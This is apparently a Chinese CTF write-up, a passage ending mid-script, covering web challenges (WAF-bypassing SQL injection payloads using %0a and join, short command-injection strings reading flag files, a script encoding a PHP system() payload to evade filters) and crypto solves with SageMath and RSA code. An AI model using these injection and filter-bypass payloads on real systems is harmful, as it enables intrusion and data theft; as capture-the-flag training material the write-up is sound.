<h3 id="小E的管理系统"><a href="#小E的管理系统" class="headerlink" title="小E的管理系统"></a>小E的管理系统</h3><p>防火墙逻辑很多 屏蔽了<code>%23 / &lt; 空格 引号 and ,</code>等等查询的时候要用的语句<br>绕过关键点:<br>空格与%20被屏蔽 使用%0a（换行）代替<br>逗号被屏蔽 使用join方法绕过<br>最终payload:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">id=1%0aunion%0aselect%0a*%0afrom%0a((select%0agroup_concat(name)%0afrom%0asqlite_master%0a)A%0ajoin%0a(select%0a1)B%0ajoin%0a(select%0a1)C%0ajoin%0a(select%0a1)D%0ajoin%0a(select%0a1)E)</span><br><span class="line">//回显用传参</span><br><span class="line">id=1%0aunion%0aselect%0a*%0afrom%0a((select%0agroup_concat(config_value)%0afrom%0asys_config%0a)A%0ajoin%0a(select%0a1)B%0ajoin%0a(select%0a1)C%0ajoin%0a(select%0a1)D%0ajoin%0a(select%0a1)E)</span><br><span class="line">//爆flag</span><br></pre></td></tr></table></figure>

<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="40.png" alt="40"></p>
<h3 id="DD加速器"><a href="#DD加速器" class="headerlink" title="DD加速器"></a>DD加速器</h3><p>明显是命令执行漏洞 先构造<br><code>127.0.0.1|ls -al </code><br><code>127.0.0.1|cat index.php</code><br>可以看到代码限制注入长度</p>
<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="25.png" alt="25"><br><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="26.png" alt="26"><br>那就尽可能缩小payload长度<br><code>1.1;find / -name flag</code><br><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="27.png" alt="27"><br>文件夹名字全输进去明显太长 用个正则<br><code>1.1;cat /.*/*flag</code><br><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="28.png" alt="28"></p>
<h3 id="搞点哦润吉吃吃橘"><a href="#搞点哦润吉吃吃橘" class="headerlink" title="搞点哦润吉吃吃橘"></a>搞点哦润吉吃吃橘</h3><p>第一层的账号密码在网页注释里<br><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="29.png" alt="29"><br><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="30.png" alt="30"><br>通关条件是3秒内算出给出的表达式并输入结果<br>提示说是抓包看生成逻辑 我直接编了个脚本算出结果输出到剪切板<br>属于力大砖飞了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line">import re</span><br><span class="line">import pyperclip</span><br><span class="line">import time</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line"># 用于存储上次剪贴板的内容，以检测是否有新的表达式</span><br><span class="line">last_clipboard_content = &quot;&quot;</span><br><span class="line"></span><br><span class="line">def calculate_token(expression):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    解析表达式字符串，使用当前时间计算 Token，并返回结果。</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    # 正则表达式寻找 &quot;* 数字) ^ 0x十六进制&quot;</span><br><span class="line">    match = re.search(r&#x27;\*\s*(\d+)\)\s*\^\s*(0x[0-9a-fA-F]+)&#x27;, expression)</span><br><span class="line"></span><br><span class="line">    if not match:</span><br><span class="line">        # 如果不是有效的表达式格式，则忽略</span><br><span class="line">        return None</span><br><span class="line"></span><br><span class="line">    try:</span><br><span class="line">        multiplier = int(match.group(1))</span><br><span class="line">        xor_hex = match.group(2)</span><br><span class="line">        xor_value = int(xor_hex, 16)</span><br><span class="line">    except Exception:</span><br><span class="line">        return None</span><br><span class="line"></span><br><span class="line">    # 获取当前 Unix 时间戳</span><br><span class="line">    t = int(time.time())</span><br><span class="line">    </span><br><span class="line">    # 计算 Token: (t * multiplier) ^ xor_value</span><br><span class="line">    token = (t * multiplier) ^ xor_value</span><br><span class="line">    </span><br><span class="line">    print(&quot;\n[+] 发现新表达式并计算:&quot;)</span><br><span class="line">    print(f&quot;  - 表达式: &#123;expression.strip()&#125;&quot;)</span><br><span class="line">    print(f&quot;  - 乘数/异或值: &#123;multiplier&#125; / &#123;xor_hex&#125;&quot;)</span><br><span class="line">    print(f&quot;  - 使用时间戳 (t): &#123;t&#125;&quot;)</span><br><span class="line">    print(f&quot;  - 计算出的 Token: &#123;token&#125;&quot;)</span><br><span class="line"></span><br><span class="line">    return str(token)</span><br><span class="line"></span><br><span class="line">def monitor_clipboard():</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    持续监控剪贴板内容，检测到有效表达式后进行计算和替换。</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    global last_clipboard_content</span><br><span class="line">    print(&quot;&gt;&gt;&gt; 脚本正在运行。请在网页上点击&#x27;开始验证&#x27;并复制新的表达式。&quot;)</span><br><span class="line">    print(&quot;&gt;&gt;&gt; 发现新表达式后，答案会瞬间替换您的剪贴板内容。&quot;)</span><br><span class="line">    print(&quot;&gt;&gt;&gt; 按 Ctrl+C 停止脚本。&quot;)</span><br><span class="line">    </span><br><span class="line">    # 初始化 last_clipboard_content</span><br><span class="line">    try:</span><br><span class="line">        last_clipboard_content = pyperclip.paste().strip()</span><br><span class="line">    except pyperclip.PyperclipException:</span><br><span class="line">        print(&quot;[-] 错误：无法访问剪贴板。请确保您在命令行环境中运行，或者尝试手动输入版本。&quot;)</span><br><span class="line">        sys.exit(1)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    while True:</span><br><span class="line">        try:</span><br><span class="line">            # 1. 读取当前剪贴板内容</span><br><span class="line">            current_clipboard_content = pyperclip.paste().strip()</span><br><span class="line">            </span><br><span class="line">            # 2. 检测内容是否更新 且 长度合理（排除空内容和很短的内容）</span><br><span class="line">            if current_clipboard_content != last_clipboard_content and len(current_clipboard_content) &gt; 20:</span><br><span class="line">                </span><br><span class="line">                # 3. 尝试计算 Token</span><br><span class="line">                token_result = calculate_token(current_clipboard_content)</span><br><span class="line">                </span><br><span class="line">                if token_result:</span><br><span class="line">                    # 4. 计算成功，将 Token 答案写入剪贴板</span><br><span class="line">                    pyperclip.copy(token_result)</span><br><span class="line">                    print(f&quot;\n&lt;&lt;&lt; 答案已写入剪贴板！请立即粘贴提交。&gt;&gt;&gt;&quot;)</span><br><span class="line">                    # 更新 last_clipboard_content 为计算结果，避免重复触发</span><br><span class="line">                    last_clipboard_content = token_result</span><br><span class="line">                else:</span><br><span class="line">                    # 如果不是有效的表达式，仅更新 last_clipboard_content，避免重复触发检查</span><br><span class="line">                    last_clipboard_content = current_clipboard_content</span><br><span class="line">                    </span><br><span class="line">            time.sleep(0.5) # 每 0.5 秒检查一次剪贴板</span><br><span class="line"></span><br><span class="line">        except KeyboardInterrupt:</span><br><span class="line">            print(&quot;\n脚本已停止。&quot;)</span><br><span class="line">            break</span><br><span class="line">        except pyperclip.PyperclipException:</span><br><span class="line">            # 忽略一些剪贴板访问错误</span><br><span class="line">            pass</span><br><span class="line">        except Exception as e:</span><br><span class="line">            print(f&quot;[-] 发生未知错误: &#123;e&#125;&quot;)</span><br><span class="line">            time.sleep(1)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    monitor_clipboard()</span><br></pre></td></tr></table></figure>

<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="31.png" alt="31"></p>
<h3 id="真的是签到诶"><a href="#真的是签到诶" class="headerlink" title="真的是签到诶"></a>真的是签到诶</h3><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="32.png" alt="32"></p>
<p>指示文档说<code>你可以使用 Cyberchef 中 *To Hex* » *Find/Replace* » *From Hex* 的流程来某个字节进行特例化修改。</code><br>这样操作是为了在构造payload途中将可能被剔除的空格进行还原<br>以下为构建payload的脚本</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python3</span><br><span class="line"># encoding: utf-8</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">import sys</span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line">def rot13(s: str) -&gt; str:</span><br><span class="line">    # ROT13 仅对 ASCII 字母有效</span><br><span class="line">    result = []</span><br><span class="line">    for ch in s:</span><br><span class="line">        o = ord(ch)</span><br><span class="line">        if &#x27;a&#x27; &lt;= ch &lt;= &#x27;z&#x27;:</span><br><span class="line">            result.append(chr((o - ord(&#x27;a&#x27;) + 13) % 26 + ord(&#x27;a&#x27;)))</span><br><span class="line">        elif &#x27;A&#x27; &lt;= ch &lt;= &#x27;Z&#x27;:</span><br><span class="line">            result.append(chr((o - ord(&#x27;A&#x27;) + 13) % 26 + ord(&#x27;A&#x27;)))</span><br><span class="line">        else:</span><br><span class="line">            result.append(ch)</span><br><span class="line">    return &#x27;&#x27;.join(result)</span><br><span class="line"></span><br><span class="line">def atbash(s: str) -&gt; str:</span><br><span class="line">    result = []</span><br><span class="line">    for ch in s:</span><br><span class="line">        if &#x27;a&#x27; &lt;= ch &lt;= &#x27;z&#x27;:</span><br><span class="line">            offset = ord(ch) - ord(&#x27;a&#x27;)</span><br><span class="line">            result.append(chr(ord(&#x27;a&#x27;) + (25 - offset)))</span><br><span class="line">        elif &#x27;A&#x27; &lt;= ch &lt;= &#x27;Z&#x27;:</span><br><span class="line">            offset = ord(ch) - ord(&#x27;A&#x27;)</span><br><span class="line">            result.append(chr(ord(&#x27;A&#x27;) + (25 - offset)))</span><br><span class="line">        else:</span><br><span class="line">            result.append(ch)</span><br><span class="line">    return &#x27;&#x27;.join(result)</span><br><span class="line"></span><br><span class="line">def make_cipher(php_payload: str, space_replacement=&#x27;\t&#x27;) -&gt; str:</span><br><span class="line"></span><br><span class="line">    # 1) 用制表符替换普通空格，避免服务端 str_replace(&#x27; &#x27;, &#x27;&#x27;, ...) 删除</span><br><span class="line">    payload_with_tabs = php_payload.replace(&#x27; &#x27;, space_replacement)</span><br><span class="line"></span><br><span class="line">    # 2) 先对 payload 做 ROT13（服务器在最后会做 ROT13，所以我们先做）</span><br><span class="line">    after_rot13 = rot13(payload_with_tabs)</span><br><span class="line"></span><br><span class="line">    # 3) 再对结果做 Atbash（服务器首先做 Atbash，所以我们要逆向构造）</span><br><span class="line">    s = atbash(after_rot13)</span><br><span class="line"></span><br><span class="line">    # 4) 把 s 作为 bytes 进行 base64 编码</span><br><span class="line">    b = s.encode(&#x27;utf-8&#x27;)</span><br><span class="line">    b64 = base64.b64encode(b).decode(&#x27;ascii&#x27;)</span><br><span class="line">    return b64</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    if len(sys.argv) &gt;= 2:</span><br><span class="line">        input_payload = &#x27; &#x27;.join(sys.argv[1:])</span><br><span class="line">    else:</span><br><span class="line">        input_payload = &#x27;system(&quot;cat /flag&quot;);&#x27;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    cipher = make_cipher(input_payload, space_replacement=&#x27;\t&#x27;)</span><br><span class="line">    print(&quot;原始 payload：&quot;)</span><br><span class="line">    print(input_payload)</span><br><span class="line">    print(&quot;\n说明：脚本已把普通空格替换为制表符 &#x27;\\t&#x27;（避免服务器删除 0x20），&quot;)</span><br><span class="line">    print(&quot;并按 atbash(ROT13(payload_with_tabs)) -&gt; base64 生成了 cipher：\n&quot;)</span><br><span class="line">    print(cipher)</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="33.png" alt="33"><br>以post传参上传cipher&#x3D;[payload]即可</p>
<h2 id="Crypto-3"><a href="#Crypto-3" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="群论小测试"><a href="#群论小测试" class="headerlink" title="群论小测试"></a>群论小测试</h3><p>互动类 </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"># SageMath 自动识别 Cayley 表群名</span><br><span class="line">from sage.all import *</span><br><span class="line"></span><br><span class="line"># --------------------------- CATALOG ---------------------------</span><br><span class="line">CATALOG = [</span><br><span class="line">    (&quot;C2&quot;,  lambda: CyclicPermutationGroup(2)),</span><br><span class="line">    (&quot;C3&quot;,  lambda: CyclicPermutationGroup(3)),</span><br><span class="line">    (&quot;C4&quot;,  lambda: CyclicPermutationGroup(4)),</span><br><span class="line">    (&quot;C5&quot;,  lambda: CyclicPermutationGroup(5)),</span><br><span class="line">    (&quot;C6&quot;,  lambda: CyclicPermutationGroup(6)),</span><br><span class="line">    (&quot;C7&quot;,  lambda: CyclicPermutationGroup(7)),</span><br><span class="line">    (&quot;C8&quot;,  lambda: CyclicPermutationGroup(8)),</span><br><span class="line">    (&quot;C9&quot;,  lambda: CyclicPermutationGroup(9)),</span><br><span class="line">    (&quot;C10&quot;, lambda: CyclicPermutationGroup(10)),</span><br><span class="line">    (&quot;V4&quot;,  lambda: AbelianGroup([2,2])),</span><br><span class="line">    (&quot;S3&quot;,  lambda: SymmetricGroup(3)),</span><br><span class="line">    (&quot;D4&quot;,  lambda: DihedralGroup(4)),</span><br><span class="line">    (&quot;D5&quot;,  lambda: DihedralGroup(5)),</span><br><span class="line">    (&quot;D6&quot;,  lambda: DihedralGroup(6)),</span><br><span class="line">    (&quot;Q8&quot;,  lambda: QuaternionGroup()),</span><br><span class="line">    (&quot;A4&quot;,  lambda: AlternatingGroup(4)),</span><br><span class="line">    (&quot;A5&quot;,  lambda: AlternatingGroup(5)),</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"># --------------------------- Helpers ---------------------------</span><br><span class="line"></span><br><span class="line">def is_abelian_table(T):</span><br><span class="line">    n = len(T)</span><br><span class="line">    return all(T[i][j] == T[j][i] for i in range(n) for j in range(n))</span><br><span class="line"></span><br><span class="line">def table_same(T1, T2):</span><br><span class="line">    &quot;&quot;&quot;判断两个 Cayley 表是否同构（暴力匹配）&quot;&quot;&quot;</span><br><span class="line">    n = len(T1)</span><br><span class="line">    from itertools import permutations</span><br><span class="line">    for perm in permutations(range(n)):</span><br><span class="line">        match = True</span><br><span class="line">        for i in range(n):</span><br><span class="line">            for j in range(n):</span><br><span class="line">                if T1[i][j] != perm[T2[perm[i]][perm[j]]]:</span><br><span class="line">                    match = False</span><br><span class="line">                    break</span><br><span class="line">            if not match:</span><br><span class="line">                break</span><br><span class="line">        if match:</span><br><span class="line">            return True</span><br><span class="line">    return False</span><br><span class="line"></span><br><span class="line"># --------------------------- 自动识别函数 ---------------------------</span><br><span class="line"></span><br><span class="line">def identify_group(T):</span><br><span class="line">    n = len(T)</span><br><span class="line">    abelian = is_abelian_table(T)</span><br><span class="line">    candidates = []</span><br><span class="line">    for key, ctor in CATALOG:</span><br><span class="line">        G = ctor()</span><br><span class="line">        if G.order() != n:</span><br><span class="line">            continue</span><br><span class="line">        # 根据 abelian 性质初步筛选</span><br><span class="line">        if abelian != G.is_abelian():</span><br><span class="line">            continue</span><br><span class="line">        # 构造群表</span><br><span class="line">        elems = list(G)</span><br><span class="line">        idx_by_elem = &#123;elems[i]: i for i in range(n)&#125;</span><br><span class="line">        T_candidate = [[idx_by_elem[elems[a]*elems[b]] for b in range(n)] for a in range(n)]</span><br><span class="line">        if table_same(T, T_candidate):</span><br><span class="line">            candidates.append(key)</span><br><span class="line">    return candidates</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="36.png" alt="36"></p>
<h3 id="RSA-revenge"><a href="#RSA-revenge" class="headerlink" title="RSA_revenge"></a>RSA_revenge</h3><p>前半部分的flag还是挺好复现的</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line">import math</span><br><span class="line">import random</span><br><span class="line">from functools import reduce</span><br><span class="line">from math import gcd</span><br><span class="line"></span><br><span class="line"># ------------ 你给出的数值（直接复制自你贴出的输出） ------------</span><br><span class="line">primes_list = [</span><br><span class="line">8477643094111283590583082266686584577185935117516882965276775894970480047703089419434737653896662067140380478042001964249802246254766775288215827674566239,</span><br><span class="line">7910991244809724334133464066916251012653855854025088993280923310153569870514093484293150987057836939645880428872351249598065661847436809250099607617398229,</span><br><span class="line">12868663117540247120940164330605349884925779832327002530579867223566756253418944553917676755694242046142851695033487706750006566539584075228562544644953317</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">n1 = 1103351600126529748374237534378639752005563260397057273760573608668234841858898339963615180586483636658319719258259564340229731088477043006707066258091746453519875771328756343070392346553837475869985292233339882321767365588480914243055530194543710833400735694644740966837509139443272712871728933520755003149497543272631963356726446399042360341133139923381402765176034620742095462597690819317740258280338778466308360122325510768573457366480478480385099879072314101166576014811788437611871531848011762293407180575205681864374034973560073644731757180275405672624629974899658185645498677923049149478738083257882839079796420483489134608949730373829870700049152830490730902518823469250714236113622490232617166274965015245948264281265453208875232918994116540222173029738472689551464384951129495828658025526216028826258099588572669439254177489891457890498930044291769038333452721765661715836795838845421437984152253836745540547878024331492328801233425013069672422548913381714868180440419922587534373534388179645778998201569812711853469607955639409976100938326204393436455902117700715705355730254907473694496862186927081288536664564066273905636691443629865742113665395817897790346568115147261785693069547062993147965228097215778787698574672103567611954541526351385121096946876318405181900957517179318858167322380305506577864659070587276190351263272904670121000123739762817165611376508091511049581310489960967300251226150505529874043827860587179066433478573304632672443028389332137578559069790875583860034559992961597964011009181097461053565357444468759142467793785272517357594961007684369171923169825343428400994582000709315829746271356743493827706669902956302087422710335869361908872578360718630332916867987882367454381486160119341248986730614715669587555561672656107579415221691270769054441036888212622679174466809685017295395823904506545225068526453243179279430769878809345179954207934650512040934969514434321887565917951423932360150276928683390148666338790317001765138293050858448249492058987889761085236104153306884365020403974305552987123976314900738336243171779096705121428628914344115125836293982077268043357822313817090167616525512714228298048543723340688062975654817272989686281447834032081689520522343318726816659742944874587243087717935463623631288732784108299093601104113561688659145661286269339180833210463</span><br><span class="line"></span><br><span class="line">c1 = 1091994761217634826072124019708574984391652131019528859451478177360336520455071879664626056517127684886792263267184750289726966173475531785135908239241367011964947254146686336678625127107000203921535502636024125382397949549706019108806905113568387688784083651867765356465676713044867529224095280990952281722377729904633765755308727317586804384907594623294542255582608130775388385053656500091188492219892541287152759373311871679053567569991598739628072091647402994694057021522875429987401797108991466209720726320411739418901734326490258573985380323870664455719118307333460877640654186421881374126846465164012283741829305792336376443671697322944983680753186871994926812712407530175535547953488409667363778877011722921746615125168842335755090712330314248078688305813574126414154357295682111730319771541764882123530538798904329448342477283010679916534388272354852606444335501019923314748714020060783702757991765107811664795881473290112012642711848840732656792842975595985262637352884148989392358729413049666423809444629233355604344713121576947744271550672311509709353155584615401385981281541568915650140285513857950097872392262841978506457072907666348887936981254691271750737368646952613446340505887570613771043863966115924851279285010321193299940403084752305457659188900451883509679442577291500194294702408740417770241347854055121038455584689346661759142226424655750649030196509606345959868857460928822458178193914427975718432613693148519385509070885413086890691471063639321214058351800789483569828355240522324245612035847073723555128381268497293297681153943700076717509367055194706714770699658667364019792069384855913700111098207862666478388154325649690787295929427544059466206456378068191323286585251490682952650730101051661446454500997013269750318207079005140046631065420740924251847948208391204635801689730778074655515676216581230345037704163062457051532737078339281175699645868527505281984564077081473213204937490995858702477009964928872064904754834804222961572810639265783286770899262602346777948115933216112376126550352514674411338374863486761612733848198090788549337632188615953986569772932102409611086086895003705261003974939487286850347660140334361903821934552381535024019082394626749532280515222512480387681995937963724398131252527927016338174692268363933916957519992512787514236065140642709723084266949</span><br><span class="line"></span><br><span class="line"># par2 values</span><br><span class="line">n2 = 1069018081462192233874980694931144545150390355151142000407896565228521856087497130221328822828336193888433906258622424173888905902703892967253752403237818439004204769185744957222426788163474091322195131517000927031632213563726678357776820914860304114493023487392954636569155416533134778017635963554249754152905136768251720862406591818283210776943594065154793598910172412634428403766286774221252340847853800584819732893065160890727141088203583945705491817754798199</span><br><span class="line"></span><br><span class="line">hint1 = 495128350277196206878301144662871873237030348510695923954264742873861239639964327065778936381957512315649691671343380037835210964239285388639258116089512827565613815144843995253866231195560373946746849139176701974882655518646303907103018798645711804858249793838527221003421990186067508970406658504653011309012705975088331579176215562874130854040538446696646570783420605205142219423250083326857924937357413604293802370900521919578742651150371880416910794941782372</span><br><span class="line"></span><br><span class="line">hint2 = 30328561797365977072611520167046226865857127358764834983211668172910299946455309984910564878419440651867811045905957544019080032899770755776597512870488988655573901143704158135658656276142062054235425241921334990614594054774876139797881802290465401101513930547809082303438739954539239681192173563314964619128522116071538744700209974655230351192503911493028021717763873423132332205605117704777006410273001461242351682504368760936763922017247768057874236213463076</span><br><span class="line"></span><br><span class="line">hint3 = 20884722618082876001516601155402590958389763080024067634953470674302186115943562475648388511118550021010685094074280890845364756164094187193286427464829840</span><br><span class="line"></span><br><span class="line">c2 = 548415661734126053738347374438337003873176731288953351164055019598761821990636552806558989407452529293973596759395078164177029251755832478675308995116633955485067347066419466003081030015784908106772410713523387155248930421498438336128348929737424937920603679054765413736671822930257854740643178209639013528748572597042833138551717910328899462934527011212318128877188460373648545379405946354668400634037669394938860103705689139981117990256660685216959315741336968</span><br><span class="line"># ------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line"># ----------------- par1: 用已知素因子列表还原 m1 -----------------</span><br><span class="line">def invmod(a, m):</span><br><span class="line">    # 擴展歐几里得</span><br><span class="line">    g, x, y = extended_gcd(a, m)</span><br><span class="line">    if g != 1:</span><br><span class="line">        raise ValueError(&quot;no inverse&quot;)</span><br><span class="line">    return x % m</span><br><span 